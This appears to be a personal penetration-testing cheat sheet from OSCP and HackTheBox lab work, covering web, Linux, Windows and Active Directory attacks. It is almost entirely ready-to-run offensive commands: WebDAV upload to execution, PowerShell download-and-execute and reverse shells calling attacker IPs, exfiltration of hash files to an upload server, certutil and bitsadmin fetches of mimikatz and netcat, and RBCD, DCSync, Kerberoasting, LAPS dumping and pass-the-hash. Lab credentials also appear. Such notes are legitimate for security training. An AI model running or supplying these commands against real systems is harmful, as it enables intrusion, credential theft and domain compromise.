# Web Apps
### LFI Cheatsheet
https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html 

### WebDAV
Manually test putting file for execution 
`curl -X PUT http://10.10.10.15/df.aspx -d @test.txt ` 
`curl http://10.10.10.15/df.aspx` 

Replace -d with `--data-binary` if moving exe

The first curl puts the file onto the webserver, and the second proves it’s there. The -d @text.txt syntax says that the data for the request should be the contents of the file text.txt.

If you can upload txt, try MOVE
```
-X MOVE - use the MOVE method
-H 'Destination:http://10.10.10.15/0xdf.aspx' - defines where to move to
http://10.10.10.15/0xdf.txt - the file to move
```
`curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt` 

--------------------------------------------

# Linux

## Shells 
[Escape restricted shell rshell](https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/)

### Escape restricted shell with sshpass
`sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash` 

### Spawn shell via Python
`python3 -c 'import pty;pty.spawn("/bin/bash")' `

### Stabilize shell (run the python pty above first)
```
alex@squashed:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
``` 

## Misconfig/Vulnerability specific commands 
[VSFTd 2.3.4 exploit](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)

[Samba username map script exploit](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#samba-exploit)

### nmap scan for shellshock
`nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56` 

------------------------------------------
# Windows 

## Crackmapexec
https://wiki.porchetta.industries/

`crackmapexec smb 10.10.10.161 -u '' -p ''`
`crackmapexec smb 10.10.10.161 --pass-pol`
`crackmapexec smb 10.10.10.161 --users`
`crackmapexec smb 10.10.10.161 --groups`

## Misconfig/Vulnerability specific commands 
[Pre-Compiled Windows Exploits for common vulns](https://github.com/abatchy17/WindowsExploits)

### Mount an NFS share that has ACL applied (root squashing)
` sudo nfspysh -o server=10.10.11.191:/var/www/html` 

## Shells and Remote access 
### RDP to Machine
`xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:[MACHINE_NAME] /u:[USERNAME] /p:[PASSWORD] /size:1180x708`
`EX: xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:manageengine /u:administrator /p:studentlab /size:1800x900`

### Check if Powershell is running as 32 or 64 bit (Helpful to check if kernel exploits are failing)
`PS C:\Users> [Environment]::Is64BitProcess` returns true/false 
if running as 32 bit, call the powershell from `C:\windows\sysNative` instead of `C:\windows\system32` 
Example - `C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')`  
More info in writeup for [Optimum](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)

### Fix $PATH on Windows (good if whoami, certutil and other exe's are "not recognized")
`set PATH=%SystemRoot%\system32;%SystemRoot%;` 

### Webshell to reverse shell with powershell
```
From Webshell, it’s time to get an interactive shell. I’ll go with my Windows stand-by, Nishang Invoke-PowerShellTcp.ps1.

Make a copy of it in the local directory.
Add a line to the end: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443
Start python3 -m http.server 80 in that same directory
Start nc -lnvp 443
Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/Invoke-PowerShellTcp.ps1%27)
``` 
--------------------------------------------
## PrivEsc
[living off the land binaries lolbas](https://lolbas-project.github.io/)

--------------------------------------------
# File Transfers 

### Start SMB Server
`smbserer.py -smb2support [SHARE_NAME] [SHARE_PATH]`
`smbserver.py -smb2support a .`
`copy \\10.10.14.15\a\file` 

### Powershell to upload to Kali
`powershell (​New​-​Object System​.​Net​.​WebClient​)​.​UploadFile​(​'http://192.168.119.143/upload.php'​, 'C:\Tools\active_directory\hashes'​)`

### Powershell to grab remote file and run it in memory
`powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1');"`

### Powershell Upload to kali - Make sure apache is running and the upload.php is there! 
`powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.143/upload.php', 'asrep_hashes.txt')`

### Certutil transfer **HIGHLY EFFECTIVE**
`certutil.exe -urlcache -split -f http://192.168.119.143:8000/mimikatz.exe`

### If certutil fails try bitsadmin
`bitsadmin /transfer job /download /priority high http://192.168.245.139/nc.exe c:\\pwn\\nc.exe'`

--------------------------------------------
# Tunneling 
### SSH Port forwarding guide
[SSH Tunneling](https://refabr1k.gitbook.io/oscp/info-gathering/ssh/ssh-tunneling)
[Pivoting and Tunneling](https://medium.com/@kuwaitison/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022)

### set up ssh port forwarding with compromised user - good if you cannot use chisel 
`sudo ssh -L 80:192.168.120.209:80 <compromised_user>@192.168.120.209` 

### Setting up chisel w/ socks proxy
*On the compromised host that you want to pivot through, proxychains socks5 needs configured* 
`./chisel client 10.10.15.4:8000 R:socks` 
*On Kali* 
`chisel server --socks5 -p 8000 -reverse`

### Proxychains nmap example
`sudo proxychains -q nmap --top-ports=1000 -Pn -sT -v -oA nmap_172.16.1.102 172.16.1.102` 

------------------------------------------------
# SSH 
### Convert SSH private key to hash for brute force
`ssh2john.py in-file-privkey > out-file.hash` 
`john out-file.hash --wordlist=/usr/share/wordlists/rockyou.txt`

### Copy ssh private key for auth
`openssl rsa -in in-file-privkey -out outfile` 

### use key for ssh
`ssh -i key-file user@10.10.10.17` 

## SSH using specific algorithm
`ssh -o KexAlgorithms=[ALGORITHM] [USERNAME]@[SERVER]`
`EX: ssh -o KexAlgorithms=diffie-hellman-group1-sha1 atmail@atmail`
USE CASE:
    - $ ssh atmail@atmail -> Unable to negotiate with 192.168.132.106 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1


--------------------------------------------------
# Passwords
## Password Mining
### grep for a string in a dir of files bash 
`grep -ls 'pass' ${PWD}/* `

### Query for the string password in dir of files CMD 
`findstr /si password *.txt` 
 
### Find strings in config files CMD 
`dir /s 'pass' == 'cred' == 'vnc' == *.config` 

### View hidden files and directories CMD
`dir /a:h`
`dir /a:d` 

## Password Cracking
### Hashcat 
[Hashcat Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

### Hashcat cracking krbtg5
`hashcat -m 13100 --force -a 0 hashes.txt /usr/share/wordlists/rockyou.txt` 

`hashcat --show hashes.txt` 

---------------------------------------------------
# Active Directory 

[AD PayloadAlltheThings Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

[Abusing Active Directory ACLs and ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

[PowerView Cheatsheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)

[Silver Ticket AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services)

[Domain Escalation Resource Based Constrained Delegation](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)
​
### Add user to domain 
`net user hacker password /add /domain` 

### Review group info 
`net group "Exchange Windows Permissions"` 

### Bloodhound python from kali
`bloodhound-python -d active.htb -u SVC_TGS -p 'GPPstillStandingStrong2k18' -gc dc.active.htb -c all -ns 10.10.10.100` 

### Get shell with PSexec 
`impacket-psexec active.htb/administrator@10.10.10.100` 
**password will prompt**

### Get shell with Evil-winrm
`evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` 

### ldapsearch to get object in a directory 
`ldapsearch -x -h 10.10.10.175 -s base namingcontexts`
        -x - simple auth
        -h 10.10.10.175 - host to query
        -s base - set the scope to base
        naming contexts - return naming contexts

`ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'` 
`ldapsearch -H ldap://<ip>:<port> -x -LLL -s sub -b "DC=<domain>,DC=local"` 

### Dump AD Users properties Powerview (w/ shell)
`get-aduser -filter * -properties *` 

### Use Powermad.ps1 to add new machine account 
`New-MachineAccount -MachineAccount MYFAKECOMPUTER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose` 

### Set PrincipalsAllowedToDelegateToAccount property on a host
`Set-ADComputer $host -PrincipalsAllowedToDelegateToAccount MYFAKECOMPUTER$`

### Confirm the PrincipalsAllowedToDelegateToAccount property is changed  
`Get-ADComputer $host -Properties PrincipalsAllowedToDelegateToAccount`

### Search for computers with PrincipalsAllowedToDelegateToAccount set 
`Get-DomainComputer | Where-Object {$_."msDs-AllowedToActOnBehalfofOtherIdentity" -ne $null}` 

### Get kerberos ticket via computer with ability to impersonate via PrincipalsAllowedToDelegateToAccount
`getST.py -spn cifs/dc.support.htb -impersonate administrator support/MYFAKECOMPUTER$` 

### export kerberos ticket in Kali
`export KRB5CCNAME=~/administrator.ccache` 

### use rbcd.py to create delegation to DC$ 
`rbcd.py -delegate-to DC$ -dc-ip 10.10.11.174 -action read support/MYFAKECOMPUTER$:123456` 

### secretsdump.py with kerberos 
`secretsdump.py -k -no-pass dc.support.htb` 

### psexec.py with hash example 
`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26 Administrator@10.10.11.174` 

### Use Powerview to Add User to a group, create a credential, then add that to DCSync rights
(Solution to HTB Forest)[https://0xdf.gitlab.io/2020/03/21/htb-forest.html]
`Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` 

### use ps remoting to invoke commands powershell 

```
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername dc01 -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
``` 

### LAPS dump password by computername
`Get-AdmPwdPassword -ComputerName dc01 | Select-Object Password,ExpirationTimestamp` 

### Check for LAPS passowrd w/ AD-Module
`Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime` 

### Kerberoasting w/ impacket
`GetUserSPNs.py -request -dc-ip 10.10.252.24 controller.local/machine1 -outputfile hashes.kerberoast` 

### LDAP search for LAPS passwords 
`ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd` 

### Enumerating users on a Windows domain with rpcclient (without credentials)

```
rpcclient -U "" -N <ip>
    rpcclient $> enumdomusers
    rpcclient $> queryuser <user_RID>
```

### Kerberoasting w/ Rubeus
`Rubeus.exe kerberoast /outfile:hashes.txt` 







